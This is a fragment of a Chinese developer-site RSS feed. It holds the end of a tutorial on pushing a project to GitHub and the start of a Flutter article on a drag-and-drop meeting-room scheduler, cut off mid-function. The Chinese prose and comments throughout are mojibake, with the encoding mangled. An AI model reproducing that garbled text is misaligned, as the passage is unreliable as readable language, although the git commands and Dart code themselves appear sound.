<span class="hljs-built_in">echo</span> <span class="hljs-string">".env"</span> &gt;&gt; .gitignore
<span class="hljs-built_in">echo</span> <span class="hljs-string">".DS_Store"</span> &gt;&gt; .gitignore
<span class="hljs-built_in">echo</span> <span class="hljs-string">"dist/"</span> &gt;&gt; .gitignore
<span class="hljs-built_in">echo</span> <span class="hljs-string">"build/"</span> &gt;&gt; .gitignore
<span class="hljs-comment"># æ ¹æ®ä½ çš„é¡¹ç›®ç±»å‹æ·»åŠ æ›´å¤š</span>
</code></pre>
<h3 data-id="heading-7">3.3 æ·»åŠ æ–‡ä»¶å¹¶æäº¤</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æŸ¥çœ‹å½“å‰çŠ¶æ€</span>
git status

<span class="hljs-comment"># æ·»åŠ æ‰€æœ‰æ–‡ä»¶åˆ°æš‚å­˜åŒºï¼ˆæ’é™¤ .gitignore ä¸­çš„æ–‡ä»¶ï¼‰</span>
git add .

<span class="hljs-comment"># æˆ–è€…é€‰æ‹©æ€§æ·»åŠ </span>
git add file1.js file2.css

<span class="hljs-comment"># æäº¤åˆ°æœ¬åœ°ä»“åº“</span>
git commit -m <span class="hljs-string">"åˆå§‹æäº¤ï¼šé¡¹ç›®åŸºç¡€æ¡†æ¶"</span>
</code></pre>
<h2 data-id="heading-8"><strong>æ­¥éª¤ 4ï¼šè¿æ¥è¿œç¨‹ä»“åº“å¹¶æ¨é€</strong></h2>
<h3 data-id="heading-9">4.1 æ·»åŠ è¿œç¨‹ä»“åº“åœ°å€</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¤åˆ¶ GitHub æä¾›çš„è¿œç¨‹ä»“åº“åœ°å€</span>
<span class="hljs-comment"># HTTPS æ–¹å¼ï¼ˆéœ€è¦æ¯æ¬¡è¾“å…¥å¯†ç æˆ– tokenï¼‰</span>
git remote add origin https://github.com/ä½ çš„ç”¨æˆ·å/ä»“åº“å.git

<span class="hljs-comment"># æˆ–è€… SSH æ–¹å¼ï¼ˆéœ€è¦é…ç½® SSH keyï¼‰</span>
<span class="hljs-comment"># git remote add origin git@github.com:ä½ çš„ç”¨æˆ·å/ä»“åº“å.git</span>

<span class="hljs-comment"># éªŒè¯è¿œç¨‹ä»“åº“</span>
git remote -v
</code></pre>
<h3 data-id="heading-10">4.2 æ¨é€ä»£ç åˆ° GitHub</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç¬¬ä¸€æ¬¡æ¨é€ï¼ˆ-u å‚æ•°è®¾ç½®ä¸Šæ¸¸åˆ†æ”¯ï¼‰</span>
git push -u origin main

<span class="hljs-comment"># å¦‚æœä½ æœ¬åœ°åˆ†æ”¯æ˜¯ masterï¼Œéœ€è¦å…ˆé‡å‘½å</span>
git branch -M main
git push -u origin main
</code></pre>
<h2 data-id="heading-11"><strong>å¸¸è§é—®é¢˜å’Œè§£å†³æ–¹æ¡ˆ</strong></h2>
<h3 data-id="heading-12">é—®é¢˜ 1ï¼šæ¨é€è¢«æ‹’ç»</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¦‚æœè¿œç¨‹ä»“åº“æœ‰ README ç­‰æ–‡ä»¶ï¼ˆä¹‹å‰è¯¯æ“ä½œï¼‰</span>
git pull origin main --allow-unrelated-histories
<span class="hljs-comment"># è§£å†³åˆå¹¶å†²çªï¼ˆå¦‚æœæœ‰ï¼‰</span>
git push origin main
</code></pre>
<h3 data-id="heading-13">é—®é¢˜ 2ï¼šéœ€è¦èº«ä»½éªŒè¯</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨ Personal Access Tokenï¼ˆæ¨èï¼‰</span>
<span class="hljs-comment"># 1. GitHub â†’ Settings â†’ Developer settings â†’ Personal access tokens</span>
<span class="hljs-comment"># 2. ç”Ÿæˆæ–° tokenï¼Œå‹¾é€‰ repo æƒé™</span>
<span class="hljs-comment"># 3. æ¨é€æ—¶ä½¿ç”¨ token ä½œä¸ºå¯†ç </span>
</code></pre>
<h3 data-id="heading-14">é—®é¢˜ 3ï¼šé…ç½® SSH Keyï¼ˆå…å¯†ç æ¨é€ï¼‰</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç”Ÿæˆ SSH Key</span>
ssh-keygen -t ed25519 -C <span class="hljs-string">"your_email@example.com"</span>

<span class="hljs-comment"># æŸ¥çœ‹å…¬é’¥å¹¶å¤åˆ¶</span>
<span class="hljs-built_in">cat</span> ~/.ssh/id_ed25519.pub

<span class="hljs-comment"># æ·»åŠ åˆ° GitHub</span>
<span class="hljs-comment"># Settings â†’ SSH and GPG keys â†’ New SSH key</span>
</code></pre>
<h2 data-id="heading-15"><strong>æ­¥éª¤ 5ï¼šåç»­æ—¥å¸¸æ“ä½œ</strong></h2>
<h3 data-id="heading-16">æ—¥å¸¸æ¨é€æµç¨‹</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. æŸ¥çœ‹ä¿®æ”¹çŠ¶æ€</span>
git status

<span class="hljs-comment"># 2. æ·»åŠ ä¿®æ”¹æ–‡ä»¶</span>
git add .

<span class="hljs-comment"># 3. æäº¤åˆ°æœ¬åœ°</span>
git commit -m <span class="hljs-string">"æäº¤æè¿°"</span>

<span class="hljs-comment"># 4. æ‹‰å–è¿œç¨‹æœ€æ–°ä»£ç ï¼ˆé¿å…å†²çªï¼‰</span>
git pull origin main

<span class="hljs-comment"># 5. æ¨é€åˆ°è¿œç¨‹</span>
git push origin main
</code></pre>
<h3 data-id="heading-17">åˆ†æ”¯ç®¡ç†ï¼ˆæ¨èï¼‰</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åˆ›å»ºæ–°åˆ†æ”¯</span>
git branch feature/new-feature
git checkout feature/new-feature

<span class="hljs-comment"># æˆ–è€…ä¸€æ­¥åˆ›å»ºå¹¶åˆ‡æ¢</span>
git checkout -b feature/new-feature

<span class="hljs-comment"># åˆå¹¶åˆ†æ”¯</span>
git checkout main
git merge feature/new-feature
</code></pre>
<h2 data-id="heading-18"><strong>å¿«é€Ÿå‘½ä»¤æ€»ç»“</strong></h2>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å®Œæ•´æµç¨‹ï¼ˆå·²æœ‰é¡¹ç›®é¦–æ¬¡æ¨é€ï¼‰</span>
<span class="hljs-built_in">cd</span> your-project
git init
git add .
git commit -m <span class="hljs-string">"first commit"</span>
git branch -M main
git remote add origin https://github.com/username/repo.git
git push -u origin main
</code></pre>
<h2 data-id="heading-19"><strong>é¢å¤–å»ºè®®</strong></h2>
<ol>
<li><strong>æäº¤è§„èŒƒ</strong>ï¼šä½¿ç”¨æ¸…æ™°çš„æäº¤ä¿¡æ¯</li>
<li><strong>åˆ†æ”¯ç­–ç•¥</strong>ï¼šå»ºè®®ä½¿ç”¨ Git Flow æˆ– GitHub Flow</li>
<li><strong>.gitignore</strong>ï¼šç¡®ä¿åŒ…å«æ‰€æœ‰æ•æ„Ÿæ–‡ä»¶å’Œä¸´æ—¶æ–‡ä»¶</li>
<li><strong>README.md</strong>ï¼šæ·»åŠ é¡¹ç›®è¯´æ˜æ–‡æ¡£</li>
</ol>
<p>æŒ‰ç…§è¿™ä¸ªæµç¨‹ï¼Œä½ çš„é¡¹ç›®åº”è¯¥èƒ½æˆåŠŸæ¨é€åˆ° GitHubã€‚å¦‚æœé‡åˆ°å…·ä½“é—®é¢˜ï¼Œå¯ä»¥å‘Šè¯‰æˆ‘é”™è¯¯ä¿¡æ¯ï¼Œæˆ‘ä¼šå¸®ä½ è§£å†³ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å†²å†²å†²ï¼ŒFlutteræ‹–æ‹‰æ‹½å®æˆ˜ï¼Œé«˜ä»¿é£ä¹¦ä¼šè®®å®¤è¯¦æƒ…é¡µ]]></title>    <link>https://juejin.cn/post/7600955777315749926</link>    <guid>https://juejin.cn/post/7600955777315749926</guid>    <pubDate>2026-01-30T10:39:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600955777315749926" data-draft-id="7377026952786329637" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å†²å†²å†²ï¼ŒFlutteræ‹–æ‹‰æ‹½å®æˆ˜ï¼Œé«˜ä»¿é£ä¹¦ä¼šè®®å®¤è¯¦æƒ…é¡µ"/> <meta itemprop="keywords" content="Flutter,å‰ç«¯,GitHub"/> <meta itemprop="datePublished" content="2026-01-30T10:39:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="rainboy"/> <meta itemprop="url" content="https://juejin.cn/user/3808364011199591"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å†²å†²å†²ï¼ŒFlutteræ‹–æ‹‰æ‹½å®æˆ˜ï¼Œé«˜ä»¿é£ä¹¦ä¼šè®®å®¤è¯¦æƒ…é¡µ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3808364011199591/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    rainboy
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T10:39:35.000Z" title="Fri Jan 30 2026 10:39:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å®ç°æ•ˆæœ</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c79637f47d3a4d48af526a4343d94a63~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcmFpbmJveQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770374812&amp;x-signature=4hUTxRXPLZsU2aH%2F%2BX8sUqLacSQ%3D" alt="schedule.gif" loading="lazy"/></p>
<h2 data-id="heading-1">ä¸»è¦åŠŸèƒ½</h2>
<ul>
<li>ğŸ“‰å¯è§†åŒ–äº‹ä»¶åˆ—è¡¨ï¼Œä¼šè®®å®¤çŠ¶æ€ä¸€è§ˆæ— ä½™ï¼Œæ¸…æ™°ç›´è§‚</li>
<li>ğŸ’¥æ”¯æŒæ‹–æ‹½é€‰æ‹©é¢„è®¢æ—¶é—´ï¼Œäº¤äº’è‡ªç„¶ï¼Œçºµäº«ä¸æ»‘</li>
<li>ğŸŒˆæä¾›ä¸°å¯Œçš„æ ·å¼é…ç½®é€‰é¡¹ï¼Œæ»¡è¶³ä¸åŒåœºæ™¯çš„è§†è§‰éœ€æ±‚</li>
</ul>
<h2 data-id="heading-2">æŠ€æœ¯å®ç°</h2>
<h3 data-id="heading-3">å®ç°ä¸»ç•Œé¢</h3>
<p>é‡‡ç”¨æ¨¡å—åŒ–è®¾è®¡æ€æƒ³ï¼Œæ ¸å¿ƒæ§ä»¶ä¸º<code>DayView</code>ï¼Œç”¨äºå±•ç¤ºå•æ—¥ä¼šè®®å®¤é¢„è®¢äº‹ä»¶ã€‚æ•´ä½“æ¶æ„é‡‡ç”¨<code>SingleChildScrollView</code>ä½œä¸ºå¤–å±‚å®¹å™¨å®ç°å‚ç›´æ»šåŠ¨ï¼Œå†…éƒ¨ä½¿ç”¨<code>Stack</code>å¸ƒå±€ç®¡ç†å¤šä¸ªè§†è§‰å…ƒç´ ã€‚</p>
<ul>
<li><strong>å·¦ä¾§æ—¶é—´è½´ç»„ä»¶</strong>ï¼šè´Ÿè´£ç»˜åˆ¶00:00-24:00çš„æ—¶é—´æ–‡æœ¬ï¼Œä¸ºç”¨æˆ·æä¾›æ—¶é—´å‚è€ƒ</li>
</ul>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">/// <span class="markdown">widgets/day<span class="hljs-emphasis">_view.dart</span></span></span>
<span class="hljs-keyword">if</span> (widget.hoursColumnStyle.width &gt; <span class="hljs-number">0</span>) {
  children.add(Positioned(
    top: <span class="hljs-number">0</span>,
    left: widget.isRTL ? <span class="hljs-keyword">null</span> : <span class="hljs-number">0</span>,
    child: HoursColumn.fromHeadersWidgetState(parent: <span class="hljs-keyword">this</span>),
  ));
}
</code></pre>
<ul>
<li><strong>å³ä¾§èƒŒæ™¯æ—¶é—´çº¿ç½‘æ ¼</strong>ï¼šè‡ªå®šä¹‰<code>CustomPaint</code>å®ç°æ¯å°æ—¶çš„æ—¶é—´åˆ†å‰²çº¿</li>
</ul>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">/// <span class="markdown">widgets/day<span class="hljs-emphasis">_view.dart</span></span></span>
Widget createBackground() =&gt; Positioned.fill(
      child: CustomPaint(
        painter: widget.style.createBackgroundPainter(
          dayView: widget,
          topOffsetCalculator: calculateTopOffset,
        ),
      ),
    );

</code></pre>
<ul>
<li><strong>å½“å‰æ—¶é—´æŒ‡ç¤ºå™¨</strong>ï¼šé€šè¿‡<code>RepaintBoundary</code>å’Œ<code>CustomPaint</code>å®ç°å®æ—¶æ›´æ–°çš„å½“å‰æ—¶é—´çº¿</li>
</ul>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">/// <span class="markdown">widgets/day<span class="hljs-emphasis">_view.dart</span></span></span>
<span class="hljs-keyword">if</span> (_showCurrentTimeIndicator()) {
  Widget? currentTimeIndicator =
      (widget.currentTimeIndicatorBuilder ?? DefaultBuilders.defaultCurrentTimeIndicatorBuilder)(widget.style, calculateTopOffset, widget.hoursColumnStyle, widget.isRTL,_currentTimeNotifier);
  <span class="hljs-keyword">if</span> (currentTimeIndicator != <span class="hljs-keyword">null</span>) {
    children.add(currentTimeIndicator);
  }
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f32e72570e34d86b2e1d3443c0c2399~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcmFpbmJveQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770374812&amp;x-signature=mTjCDf2MitnJcl%2BDL5QiAXc%2BR28%3D" alt="ui.png" loading="lazy"/></p>
<ul>
<li><strong>äº‹ä»¶åˆ—è¡¨æ¸²æŸ“</strong>ï¼šåŸºäº<code>FlutterWeekViewEvent</code>æ•°æ®æ¨¡å‹ï¼ŒåŠ¨æ€ç”Ÿæˆä¼šè®®å®¤é¢„è®¢äº‹ä»¶å¡ç‰‡</li>
</ul>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">/// <span class="markdown">widgets/day<span class="hljs-emphasis">_view.dart</span></span></span>
children.addAll(eventsDrawProperties.entries.map((entry) =&gt; entry.value.createWidget(
      context,
      widget,
      buildResizeUpGestureDetector(entry.key),
      buildResizeDownGestureDetector(entry.key),
      entry.key,
    )));
</code></pre>
<p><strong>äº‹ä»¶æ•°æ®ç»“æ„</strong>ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">/// <span class="markdown">event.dart</span></span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FlutterWeekViewEvent</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Comparable</span>&lt;<span class="hljs-title">FlutterWeekViewEvent</span>&gt; </span>{
   <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> title;         <span class="hljs-comment">// äº‹ä»¶æ ‡é¢˜</span>
   <span class="hljs-keyword">final</span> <span class="hljs-built_in">String</span> description;   <span class="hljs-comment">// äº‹ä»¶æè¿°</span>
   <span class="hljs-built_in">DateTime</span> start;             <span class="hljs-comment">// å¼€å§‹æ—¶é—´</span>
   <span class="hljs-built_in">DateTime</span> end;               <span class="hljs-comment">// ç»“æŸæ—¶é—´</span>
   <span class="hljs-comment">// å…¶ä»–å±æ€§...</span>
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15fdf64ec7594e6f8ebda93006d365b4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcmFpbmJveQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770374812&amp;x-signature=xHMXuYpk%2BfVUs%2ByIwr0Fuqgqh4w%3D" alt="events.png" loading="lazy"/></p>
<h3 data-id="heading-4">å®ç°æ‹–æ‹½è°ƒæ•´åŠŸèƒ½</h3>
<p>é€šè¿‡<code>GestureDetector</code>ç»„ä»¶å®ç°äº‹ä»¶çš„å‚ç›´æ‹–æ‹½è°ƒæ•´ï¼Œæ”¯æŒä¿®æ”¹äº‹ä»¶çš„å¼€å§‹å’Œç»“æŸæ—¶é—´ï¼š</p>
<ol>
<li><strong>æ‹–æ‹½æ‰‹åŠ¿ç›‘å¬</strong>ï¼šä¸º<strong>æ–°åˆ›å»ºäº‹ä»¶</strong>æ·»åŠ ä¸¤ä¸ª<code>GestureDetector</code>ï¼Œåˆ†åˆ«å¤„ç†ä¸Šä¸‹æ‹–æ‹½æ“ä½œ</li>
<li><strong>ä½ç½®è®¡ç®—</strong>ï¼šæ ¹æ®æ‹–æ‹½åç§»é‡è®¡ç®—æ–°çš„æ—¶é—´ä½ç½®</li>
<li><strong>è¾¹ç•Œå¤„ç†</strong>ï¼šå®ç°æœ€å°äº‹ä»¶æ—¶é•¿é™åˆ¶ï¼Œç¡®ä¿ç”¨æˆ·ä½“éªŒ</li>
<li><strong>çŠ¶æ€æ›´æ–°</strong>ï¼šæ‹–æ‹½ç»“æŸåæ›´æ–°äº‹ä»¶æ•°æ®å¹¶åˆ·æ–°UI</li>
</ol>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">/// <span class="markdown">widgets/day<span class="hljs-emphasis">_view.dart</span></span></span>
<span class="hljs-comment">/// <span class="markdown"><span class="hljs-emphasis">å‘ä¸Šæ‹–æ‹½è°ƒæ•´å¼€å§‹æ—¶é—´</span></span></span>
Widget? buildResizeUpGestureDetector(FlutterWeekViewEvent event,) {
  <span class="hljs-keyword">if</span> (widget.resizeEventOptions == <span class="hljs-keyword">null</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
  }
  <span class="hljs-keyword">return</span> GestureDetector(
    onVerticalDragStart: (_) {
      accumulatedResizeOffset = <span class="hljs-number">0</span>;
      originalResizeEventStart = event.start;
    },
    onVerticalDragEnd: (_) {
      <span class="hljs-built_in">DateTime</span> newEventStart = event.start;
      event.start = originalResizeEventStart;
      widget.resizeEventOptions!.onEventResizedUp(event, newEventStart);
      setState(() {
        reset();
        createEventsDrawProperties();
      });
    },
    onVerticalDragUpdate: (details) =&gt; onEventResizeUpUpdate(event, details.primaryDelta ?? <span class="hljs-number">0</span>),
    child: MouseRegion(
      cursor: SystemMouseCursors.resizeUpDown,
      child: Container(color: Colors.transparent),
    ),
  );
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc5437a4d93949928b323329862915bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgcmFpbmJveQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770374812&amp;x-signature=L0C0sjHxDk%2Bt%2BK69VVWlFVFHnGs%3D" alt="gestureDetector.png" loading="lazy"/></p>
<h3 data-id="heading-5">å®ç°æ‹–æ”¾åŠŸèƒ½</h3>
<p>åˆ©ç”¨Flutterä¸­çš„<code>Draggable</code>å’Œ<code>DragTarget</code>ç»„ä»¶å®ç°äº‹ä»¶çš„è‡ªç”±æ‹–æ”¾ï¼š</p>
<blockquote>
<p><code>Draggable</code>å¯ä»¥è®©ç»„ä»¶åœ¨ç•Œé¢ä¸Šä»»æ„æ‹–åŠ¨ï¼ŒåŒæ—¶æºå¸¦ä¸€ä¸ªæ³›å‹Tçš„æ•°æ®ï¼Œ<code>DragTarget</code>ç”¨äºå®šä¹‰ä¸€ä¸ªæ‹–åŠ¨çš„ç›®æ ‡åŒºåŸŸï¼Œå¯ä»¥æ¥æ”¶<code>Draggable</code>ç»„ä»¶çš„ä¿¡æ¯ã€‚</p>
</blockquote>
<ol>
<li><strong>äº‹ä»¶åŒ…è£…</strong>ï¼šå°†äº‹ä»¶å¡ç‰‡åŒ…è£…åœ¨<code>Draggable</code>ç»„ä»¶ä¸­ï¼Œæ”¯æŒé•¿æŒ‰æˆ–ç‚¹å‡»è§¦å‘æ‹–æ‹½</li>
<li><strong>ç›®æ ‡åŒºåŸŸ</strong>ï¼šä½¿ç”¨<code>DragTarget</code>åŒ…è£¹æ•´ä¸ªæ—¥è§†å›¾ï¼Œæ¥æ”¶æ‹–æ”¾äº‹ä»¶</li>
<li><strong>ä½ç½®è®¡ç®—</strong>ï¼šåœ¨æ‹–æ‹½è¿‡ç¨‹ä¸­å®æ—¶è®¡ç®—æ–°ä½ç½®å¯¹åº”çš„æ—¶é—´ï¼Œåˆ·æ–°UI</li>
</ol>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">/// <span class="markdown">utils/event<span class="hljs-emphasis">_grid.dart</span></span></span>
<span class="hljs-comment">/// <span class="markdown"><span class="hljs-emphasis">äº‹ä»¶æ‹–æ‹½åŒ…è£…</span></span></span>
child = _getDraggableOrLongPressDraggable(
  isLongPress: options.startingGesture == DragStartingGesture.longPress,
  data: event,
  axis: options.allowOnlyVerticalDrag ? Axis.vertical : <span class="hljs-keyword">null</span>,
  feedback: SizedBox(
    height: height!,
    width: width!,
    child: child,
  ),
  childWhenDragging: Opacity(opacity: <span class="hljs-number">0.5</span>, child: child),
  child: child,
);
  
</code></pre>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">/// <span class="markdown">widgets/day<span class="hljs-emphasis">_view.dart</span></span></span>
<span class="hljs-comment">/// <span class="markdown"><span class="hljs-emphasis">æ‹–æ”¾ç›®æ ‡åŒºåŸŸ</span></span></span>
mainWidget = DragTarget&lt;FlutterWeekViewEvent&gt;(
  builder: (_, __, ___) =&gt; createMainWidget(),
  onMove: (details){
    <span class="hljs-comment">/// <span class="markdown"><span class="hljs-emphasis">è®¡ç®—æ–°ä½ç½®å¯¹åº”çš„æ—¶é—´</span></span></span>
    RenderBox renderBox = context.findRenderObject() <span class="hljs-keyword">as</span> RenderBox;
    Offset localOffset = renderBox.globalToLocal(details.offset);
    Offset correctedOffset = Offset(localOffset.dx, localOffset.dy + (verticalScrollController?.offset ?? <span class="hljs-number">0</span>) - widget.padding.top);
    <span class="hljs-built_in">DateTime</span> newStartTime = widget.date.add(calculateOffsetHourMinute(correctedOffset).asDuration);
     <span class="hljs-comment">/// <span class="markdown"><span class="hljs-emphasis">ç½‘æ ¼å¯¹é½å¤„ç†</span></span></span>
    <span class="hljs-keyword">if</span>(widget.resizeEventOptions!=<span class="hljs-keyword">null</span>) {
      newStartTime= roundTimeToFitGrid(newStartTime,
          gridGranularity: widget.resizeEventOptions!.snapToGridGranularity);
    }
    <span class="hljs-comment">/// <span class="markdown"><span class="hljs-emphasis">æ›´æ–°é¢„è§ˆä½ç½®</span></span></span>
    widget.timeRangeStartNotifier?.value = newStartTime;
    widget.timeRangeEndNotifier?.value = details.data.end.add(newStartTime.difference(details.data.start));
  },
  onAcceptWithDetails: (details) {
    <span class="hljs-comment">/// <span class="markdown"><span class="hljs-emphasis">å¤„ç†æ‹–æ”¾å®Œæˆé€»è¾‘</span></span></span>
    RenderBox renderBox = context.findRenderObject() <span class="hljs-keyword">as</span> RenderBox;
    Offset localOffset = renderBox.globalToLocal(details.offset);
    Offset correctedOffset = Offset(localOffset.dx, localOffset.dy + (verticalScrollController?.offset ?? <span class="hljs-number">0</span>) - widget.padding.top);
